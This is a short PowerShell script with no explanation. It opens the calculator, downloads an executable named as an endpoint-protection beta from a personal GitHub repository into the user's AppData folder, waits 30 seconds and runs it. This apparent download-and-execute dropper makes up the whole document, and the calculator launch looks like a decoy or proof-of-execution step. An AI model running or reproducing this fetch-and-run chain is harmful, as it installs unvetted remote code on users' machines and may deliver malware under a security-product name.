Start-Process "calc.exe"
$x = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/beta/RAVEndpointProtection.exe"
$y = "$env:USERPROFILE\AppData\Local\RAVEndpointProtectionbeta.exe"

Invoke-WebRequest -Uri $x -OutFile $y
Start-Sleep -Seconds 30
Start-Process $y
